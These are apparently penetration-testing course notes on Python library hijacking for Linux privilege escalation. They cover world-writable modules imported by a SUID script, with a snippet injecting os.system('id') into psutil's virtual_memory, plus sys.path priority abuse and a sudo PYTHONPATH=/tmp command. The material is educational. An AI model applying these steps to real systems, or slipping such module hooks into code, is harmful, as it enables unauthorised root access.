
Three basic vulnerabilities where hijacking can be used:

1. [[#Wrong Write Permissions]]
2. [[#Library Path]]
3. [[#PYTHONPATH Environment Variable]]

---
## Wrong Write Permissions

One or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want.

If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.

```sh
ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

Reading the file we find that module `psutil` is imported. We can look for the used functions in the folder of `psutil` and check if this it has write permissions for us.

```sh
> grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*  ### looking for the fucntion

  /usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():

> ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py ### perms

  -rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-
  packages/psutil/__init__.py
```

Now all we need to do is edit this function and it is **recommended** to put the **malicious code at the beginning only**, then we can test its functionality using the OS module and running the `.py` file with the updated function.

### Hijacking

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

---
## Library Path

The order in which Python imports `modules` from are based on a priority system.

```sh
python3 -c 'import sys; print("\n".join(sys.path))' ### priority list
```

To be able to use this variant, two prerequisites are necessary.

1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

So, if i have a module in the 4th listing and i have permissions to the 2nd listing, i can just create a new module with `exact same name` and `same functions with equal number of arguments`.

---
## PYTHONPATH Environment Variable

`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.

We are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. 

Write a malicious module in `/tmp` and:
```sh
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/x1o3/mem_status.py
```

---